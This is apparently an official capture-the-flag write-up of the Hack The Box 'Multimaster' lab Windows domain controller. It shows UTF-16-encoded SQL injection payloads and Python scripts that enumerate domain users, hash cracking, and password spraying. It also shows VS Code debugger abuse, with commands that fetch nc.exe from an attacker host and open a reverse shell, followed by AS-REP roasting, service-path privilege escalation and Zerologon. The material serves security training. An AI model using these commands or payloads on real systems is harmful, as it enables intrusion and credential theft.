@@ -1,0 +1,458 @@
+Multimaster
+
+16th September 2020 / Document No D20.100.87
+Prepared By: MrR3boot & cube0x0
+Machine Author(s): egre55 & MinatoTW
+Difficulty: Insane
+Classification: Official
+Synopsis
+
+Multimaster is an insane difficulty Windows machine featuring a web application that is
+vulnerable to SQL Injection. This vulnerability is leveraged to obtain the foothold on the server.
+Examination the file system reveals that a vulnerable version of VS Code is installed, and VS Code
+processes and found to be running on the server. By exploiting debug functionality, a shell as the
+user cyork can be gained. A password is found in a DLL, which due to password reuse, results in
+a shell as sbauer . This user is found to have GenericWrite permissions on the user jorden .
+Abusing this privilege allows us to gain access to the server as this user. jorden is be member of
+Server Operators group, whose privileges we exploit to get a SYSTEM shell.
+
+Skills Required
+
+      Basic knowledge of Windows
+      Basic knowledge of Active Directory
+      OWASP Top 10
+
+Skills Learned
+
+      SQL Injection
+      Password Cracking
+      VS Code Exploitation
+      Reverse Engineering
+      Server Operators Group Abuse
+      SeBackup Privilege Abuse
+      Zerologon Exploitation
+Enumeration
+
+Nmap
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.179 | grep ^[0-9] | cut -d '/' -f
+   1 | tr '\n' ',' | sed s/,$//)
+   nmap -sC -sV -p$ports 10.10.10.179
+
+The scan reveals many ports open, including port 53 (DNS), 389 (LDAP) and 445 (SMB). This
+reveals that the server is a domain controller. The domain is identified by Nmap as
+MEGACORP.LOCAL .
+
+IIS
+
+Let's browse to port 80.
+This looks like an employee portal. Let's click on the LOGIN button.
+
+Populating the form and clicking the LOGIN button returns a prompt stating that the login
+feature is currently undergoing maintenance.
+The Gallery page is static and displays some images.
+
+The Colleague Finder page has a search field. Clicking on the search icon with an empty field
+returns results for employees, along with attributes for their name, job role and email address.
+
+Let's capture this request in Burp Suite, and hit CTRL + R to send this to Repeater.
+This reveals a POST request sent to the /api/getColleagues API endpoint, with name
+parameter in JSON format. The response showing the five fields id , name , position , email
+and src is also in JSON format.
+Let's retrieve the employee names by sending a cURL request and using the jq processor to
+convert the response into JSON.
+
+Similarly for employee email addresses.
+We can save the results to names.txt and emails.txt for further enumeration. The search
+query is probably connecting to a database in order to retrieve the results. So a good candidate is
+to test for SQL injection vulnerabilities. Let's try injecting a quote and check the response.
+
+The server throws a 403 Forbidden error message, which indicates that there could be possible
+input filtering happening, either within the application or a Web Application Firewall.
+To circumvent this, we can try other encoding schemes supported by JSON . Examination of the
+JSON RFC reveals that default encoding is UTF-8 , but it also supports UTF-16 and UTF-32
+encoding. Let's try injecting a quote in UTF-16 format.
+This time no error is returned, so it's worth investigating this further. We can either use an online
+converter or write a simple Python script to encode a given payload as UTF-16.
+
+   input=raw_input('> ').strip()
+   utf=[]
+   for i in input:
+
+                 utf.append("\\u00"+hex(ord(i)).split('x')[1])
+   print ''.join([i for i in utf])
+Let's encode ' or 1=1-- - payload.
+
+We can now try submitting this payload in the request.
+
+This is successful, which validates the SQL Injection vulnerability. Let's identify the number of
+columns.
+
+Injecting the payload above returns valid results.
+Let's check if table has more than five columns.
+
+This returns null , which confirms that the table has five columns. Recalling the Nmap scan
+results, it's clear that Microsoft SQL Server is in use. Let's enumerate the current database
+version and name.
+
+   test' UNION SELECT 1,@@VERSION,DB_NAME(),4,5-- -
+Database name is Hub_DB . We can proceed to enumerate table names.
+   test' UNION SELECT 1,table_name,3,4,5 FROM INFORMATION_SCHEMA.TABLES-- -
+
+There are two tables present in the database.
+   1. Colleagues
+   2. Logins
+
+The Logins table looks interesting. Let's enumerate columns in the Logins table.
+   test' UNION SELECT 1,name,3,4,5 FROM syscolumns WHERE id=(SELECT id FROM
+   sysobjects WHERE name = 'Logins')-- -
+There are two columns in the table:
+   1. username
+   2. password
+
+We can retrieve the usernames and passwords.
+   test' UNION SELECT 1,username,password,4,5 FROM Logins-- -
+
+The passwords hashes are 96 bytes in length. We can use PowerShell and Hashcat to search for
+all hashes that are 96 in length, in order to identify the mode we should use.
+
+   $hashes=(.\hashcat64.exe --example-hashes | where {$_.split('HASH: ')[-1].length
+   -like 96})
+   hashcat64.exe --example-hashes |Select-String $hashes -Context 2,1)
+The output reveals that it can be either a SHA2-384 , SHA3-384 or a Keccak-384 hash
+There are total 4 unique hashes in the table. We can save them to a file and subject them to an
+offline brute force attack using Hashcat. The hashcat modes for these are 10800 , 17500 and
+17900 . Let's try with each mode.
+
+   hashcat -a 0 -m 10800 hashes /usr/share/wordlists/rockyou.txt
+   hashcat -a 0 -m 17500 hashes /usr/share/wordlists/rockyou.txt
+   hashcat -a 0 -m 17900 hashes /usr/share/wordlists/rockyou.txt
+
+Using the Keccak-384 mode, three of the hashes were successfully cracked. Previous
+enumeration provided a list of email addresses. Usernames can sometimes be the same as the
+email address prefixes. Let's compile a new list of usernames from this list.
+
+   cat emails.txt | tr -d '"' | cut -d '@' -f 1 > usernames.txt
+
+We can now attempt to spray the three passwords and list of usernames against the externally
+exposed SMB and WinRM services using crackmapexec . CrackMapExec can be installed with the
+following commands:
+
+   apt-get install -y libssl-dev libffi-dev python-dev build-essential
+   git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec
+   cd CrackMapExec
+   python3 setup.py install
+
+We can now start the online bruteforce attack.
+
+   crackmapexec smb 10.10.10.179 -u usernames.txt -p password1
+   crackmapexec winrm 10.10.10.179 -u usernames.txt -p password1
+The password spray was unsuccessful for both services, which means that the cracked
+credentials don't belong to the users in our list.
+
+Domain User Enumeration
+
+In Active Directory, every user, group, and computer has a unique identifier called an RID , which
+is the last part of a SID (Security Identifier). Similar to the principal_id in SQL server, the RID
+is a number that is incrementally assigned to domain objects. If we identify the RID for one user,
+it is possible to iterate over the RID range in order to identify other domain users.
+SQL Server has a function SUSER_SID() , which returns a Security Identification Number (SID) for
+a given user. Let's use this to identify the SID of the primary domain administrator.
+
+   test' union select 1,2,3,4,SUSER_SID('MegaCorp\Administrator')-- -
+
+The output returned by the query is in VARBINARY format and the UNION statement is converting
+it to a string that is not readable. Instead, we can exfiltrate the SID one by one as integers using
+the first column id . Let's identify the total length of the SID using the DATALENGTH() function.
+
+   test' UNION SELECT 1,2,3,4,DATALENGTH(SUSER_SID('MegaCorp\Administrator'))-- -
+The SUBSTRING() function can be used to exfiltrate each character.
+   test' UNION SELECT SUBSTRING(SUSER_SID('MegaCorp\Administrator'),1,1),2,3,4,5--
+   -
+
+The query returns 1. This means that the first two digits are 01 , which is expected. Let's
+automate this to identify the SID of the administrator user.
+
+   import json
+   import requests
+   from time import sleep
+   url = 'http://10.10.10.179/api/getColleagues'
+   def unicode(str):
+
+                 utf=[]
+                 for i in str:
+
+                                utf.append("\\u00"+hex(ord(i)).split("x")[1])
+                 return ''.join([i for i in utf])
+   sid=''
+   for i in range(1,29):
+                 payload="test' UNION SELECT
+   SUBSTRING(SUSER_SID('MegaCorp\Administrator'),{},1),2,3,4,5-- -".format(i)
+                 r = requests.post(url,data='{"name":"'+ unicode(payload) +
+   '"})',headers={'Content-Type': 'Application/json'})
+
+                 id=json.loads(r.text)[0]["id"]
+                 if len(str(id))==1:
+
+                                id='0'+str(id)
+                 else:
+
+                                id=hex(id).split('x')[1]
+                 sleep(2)
+                 sid+=id
+   print "0x%s"%(sid)
+The above script increments the substring position to enumerate SID values one by one. It seems
+that the server blocks access after several attempts. We can use a sleep of two seconds to avoid
+detection by the WAF.
+
+We can now use the SUSER_SNAME() function to perform a reverse lookup of the obtained SID.
+For example, the following query should return MEGACORP\Administrator
+
+   test' union select
+   1,2,3,4,SUSER_SNAME(0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000)-
+   --
+
+The obtained Hex SID value is 56 bytes in length. The first 48 bytes are domain SID. The domain
+SID is the unique identifier for the domain and the base of every full RID. After we have the SID
+we can start constructing our own RIDs in order to sequentially enumerate domain users.
+
+      RID : 0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000
+      SID : 0x0105000000000005150000001c00d1bcd181f1492bdfc236
+      In Active Directory, any group or user that Windows doesn't create has a RID of 1000 or
+      greater. If we examine the last 8 bytes of RID, we can see that the value f401 is padded by
+      0s. If we flip this value and convert it to an int we get the value of 500 , which is the RID for
+      the default Administrator user account.
+
+We can now automate this process to bruteforce RIDs starting from 1000 and identify domain
+users.
+
+   import json
+   import requests
+   from time import sleep
+
+   url = 'http://10.10.10.179/api/getColleagues'
+
+   def unicode(str):
+                 utf=[]
+                 for i in str:
+                                utf.append("\\u00"+hex(ord(i)).split("x")[1])
+                 return ''.join([i for i in utf])
+
+   sid=''
+   for i in range(1100,1200):
+
+                 i=hex(i)[2:].upper()
+                 if len(i)<4:
+
+                                i='0'+i
+                 t=bytearray.fromhex(i)
+                 t.reverse()
+                 t=''.join(format(x,'02x') for x in t).upper()+'0'*4
+                 sid='0x0105000000000005150000001c00d1bcd181f1492bdfc236{}'.format(t)
+                 payload="test' UNION SELECT 1,SUSER_SNAME({}),3,4,5-- -".format(sid)
+                 r = requests.post(url,data='{"name":"'+ unicode(payload) + '"}',headers=
+   {'Content-Type': 'Application/json'})
+                 user=json.loads(r.text)[0]["name"]
+                 if user:
+
+                                print user
+                 sleep(2)
+
+The above scripts bruteforces the RIDs from 1100 to 1200.
+Foothold
+
+The script has identified four additional usernames. Let's use CrackMapExec to spray the
+usernames and passwords against SMB and WinRM services.
+
+   crackmapexec winrm 10.10.10.179 -u andrew tushikikatomo svc-nas lana -p finance1
+   banking1 password1
+
+WinRM
+
+The credential tushikikatomo / finance1 is found to be valid. we can try to login using WinRM
+(port 5985). Windows Remote Management (WinRM), is a Windows-native built-in remote
+management protocol and allows administrators and power users to manage systems remotely.
+We can use Evil-WinRM to connect to the remote system.
+
+   evil-winrm -i 10.10.10.179 -u tushikikatomo -p finance1
+
+We don't have access to the C:\inetpub folder. This user also seems to be unprivileged. Let's
+continue host enumeration.
+Lateral Movement (cyork)
+
+Inspection of the Program Files folder reveals that VSCode is installed.
+
+Let's list the running processes using the ps or Get-Process commands.
+
+The output confirms that VSCode processes are running on the server. Let's check the version.
+This specific version is vulnerable to a command execution vulnerability, as explained in this
+blogpost. The blogpost includes an advisory by Tavis Ormandy, highlighting that the VSCode
+remote debugger is enabled by default. By adding Tavis as a search term, we come across his
+cefdebug repo. This enables interaction with and exploitation of electron, CEF, and chromium
+debuggers. We can obtain the compiled binary here.
+After downloading the release and unzipping, the binary is transferred to the server using the
+upload command in Evil-WinRM.
+
+   wget https://github.com/taviso/cefdebug/releases/download/v0.2/cefdebug.zip
+   unzip cefdebug.zip
+
+Let's run the debugger in order to identify listening sockets.
+
+This identified that two CEF debuggers are present. Let's validate the vulnerability (or feature
+abuse) by executing sample code.
+
+Service interaction is confirmed. Next, we can look to obtain a reverse shell. Let's stand up a web
+server on port 80 and issue the commands below to download a Netcat binary to the box.
+
+   python3 -m http.server 80
+   process.mainModule.require('child_process').exec('powershell IWR -Uri
+   http://10.10.14.10/nc.exe -Outfile c:\\windows\\temp\\test.exe')
+We can now stand up a listener on port 1234 and issue the command below to get a reverse
+shell.
+
+   .\cefdebug.exe --url ws://127.0.0.1:24891/256a9df8-f613-4ec0-a657-fa2de1ebe33f -
+   -code
+   "process.mainModule.require('child_process').exec('c:\\windows\\temp\\test.exe -
+   e cmd.exe 10.10.14.10 1234')"
+Lateral Movement (sbauer)
+
+Checking the user information, we see that cyork is a member of the Developers group, which
+has access to the C:\inetpub folder.
+
+Inspection of this folder reveals some interesting files and folders.
+Reverse Engineering
+
+The bin folder looks interesting, and careful examination of the files reveals the library
+MultimasterAPI.dll . We can stand up an SMB server using Impacket's smbserver.py, in order
+to transfer it locally for further examination.
+
+   python smbserver.py share . -username test -password test
+The net use command is used to map the drive.
+
+The dll is copied to the mapped drive, and the file command reveals that this is a .Net
+assembly.
+
+Using the .NET assembly editor and debugger dnSpy, we can view the source code directly.
+Inspection of MultimasterAPI.Controllers > ColleagueController reveals a database
+connection string containing the password D3veL0pM3nT! .
+
+Passwords in an organization are often of a similar format or even reused, and it is worth
+checking for this. Before attempting the password spray, let's check the domain password policy.
+Account lockouts are not enforced, so there is no risk password spraying. Let's spray against the
+WinRM service using the obtained password and list of usernames from earlier.
+
+This reveals that the password has been reused. We can now login to WinRM as sbauer /
+D3veL0pM3nT! .
+Privilege Escalation
+
+BloodHound
+
+We can use Bloodhound to enumerate and visualise the Active Directory domain, and identify
+possible attack chains that will allow us to elevate our domain privileges. The bloodhound-python
+ingestor can be used to remotely collect data from Active Directory. Then, we can run
+bloodhound to visualise any available attack paths.
+
+   sudo apt install bloodhound
+   sudo pip install bloodhound-python
+   bloodhound-python -c ALL -u sbauer -p 'D3veL0pM3nT!' -d megacorp.local -ns
+   10.10.10.179
+
+First, start the neo4j server, login the the URL provided, and set the password.
+   neo4j console
+
+Then type bloodhound to access the BloodHound UI, and log in with the neo4j credentials. When
+bloodhound-python completes, compress the files into a zip and upload it.
+
+   zip info.zip *.json
+BloodHound data consists of Nodes that represent principals and other objects in Active
+Directory, and Edges, which are links representing some form of object-to-object control or
+privileges. On the Search tab, input SBAUER@MEGACORP.LOCAL and mark this user as owned. Now
+clicking on the user icon > Reachable High Value Targets shows that this user has
+GenericWrite permission on JORDEN@MEGACORP.LOCAL . This user is considered high-value,
+owning to their membership of the highly privileged Server Operators group.
+Generic Write access grants the ability to write to any non-protected attribute on the target
+object, including members for a group, and serviceprincipalnames for a user. We can abuse
+this permission to disable Kerberos pre-authentication for the Jorden user.
+Kerberos pre-authentication is a security feature that provides protection against password-
+guessing attacks. In some cases, applications require this setting to be enabled for their service
+account. When pre-authentication is not enforced, one could directly send a dummy request for
+authentication. The Key Distribution Center (KDC) of the Domain Controller will check the
+authentication service request (AS-REQ), verify the user information and return an encrypted
+Ticket Granting Ticket (TGT). The TGT contains material (the timestamp) that is encrypted with the
+NTLM hash of the corresponding account. A hash can be derived from this, that can be subjected
+to an offline brute force attack in order to reveal the plaintext password.
+Assuming that Jorden has weak password set, let's disable Kerberos pre-authentication for
+them using the Get-ADUser AD Module cmdlet.
+
+   Get-ADUser -Filter 'Name -like "Jor*"' | Set-ADAccountControl -
+   doesnotrequirepreauth $true
+
+Next, add the MEGACORP.local domain name to /etc/hosts .
+
+   10.10.10.179 MEGACORP.local
+
+Using Impacket's GetNPUser, we can attempt an ASREPRoasting attack in order to extract a hash
+from user accounts that do not require pre-authentication.
+
+   GetNPUsers.py MEGACORP.local/jorden -request
+Hashcat
+
+Hashcat can be used to brute force the password. We can save this to the file hash , and then
+determine the correct hash mode for ASREPRoasting.
+
+   hashcat --help | grep Kerberos
+
+We choose Kerberos 5 AS-REP etype 23 , i.e. mode 18200 . Next, run Hashcat, specifying this
+mode and the rockyou.txt wordlist.
+
+   hashcat -a 0 -m 18200 hash /usr/share/wordlists/rockyou.txt --force
+
+We can now login to WinRM with the credential jorden / rainforest786 .
+The Server Operators group allows members to start, stop and change the properties of the
+browser (Computer Browser) service - and other services. We can use this privilege to modify the
+service binary path. As the browser and some other modifiable services run in the context of
+SYSTEM, membership of this group should be monitored and restricted, especially as it also
+permits logging on interactively to domain controllers.
+
+We issue the commands above and verify that the binary path was successfully changed. Let's
+stop and start the service.
+Now that the password for the primary domain administrator has been changed, we can use
+Impacket's psexec.py to gain a shell as SYSTEM.
+Alternate Method 1 (SeBackupPrivilege)
+
+Members of the Server Operators group are also bestowed the powerful SeBackupPrivilege
+that can be used to read files.
+
+On Windows, if a user has the Back up files and directories right, they are assigned
+the SeBackupPrivilege privilege. This privilege is disabled by UAC in a default installation, but
+when enabled, it allows the user to access files and directories that they don't own or have
+permission to access.
+
+We can use the built-in robocopy utility with the /b switch to copy the Administrator desktop
+folder.
+
+   robocopy /B C:\users\administrator\desktop .
+And we can cat the flag
+Alternate Method 2 (CVE-2020-1472)
+
+CVE-2020-1472 is an elevation of privilege vulnerability that exploits an insecure use of the AES-
+CFB8 cryptography, allowing an attacker to authenticate anonymously to a Netlogon server
+service (the Netlogon server is hosted by Domain Controllers). Once authenticated, we can send
+Netlogon calls as any computer. Calls that receive data are encrypted with a session key that we
+don't have access to, but we can use all the set calls like NetrServerPasswordSet2 . The
+NetrServerPasswordSet2 call allows us to set the domain controller machine account password
+to a known value, in whose context we can DCSync the domain to retrieve the domain admin
+hashes. As the DC machine account password is important for mechanisms such as trust
+relationships in order to encrypt communication, this exploit will most likely break things in
+production if there is no immediate restoration.
+Let's download the exploit and run it.
+
+This is successful. The exploit will set the Computer Account password to an empty NT hash
+31d6cfe0d16ae931b73c59d7e0c089c0 . We can now use Impacket's secretsdump.py to perform a
+DC Sync attack. DCSync works by using the Directory Replication Service Remote Protocol that
+allows replication of secret domain data. This secret domain data includes the password
+database. Domain Controllers must have this right for replication purposes so that all DCs in the
+domain have the same data.
+
+We can now perform a Pass The Hash attack using the obtained hashes to obtain a SYSTEM shell.
+
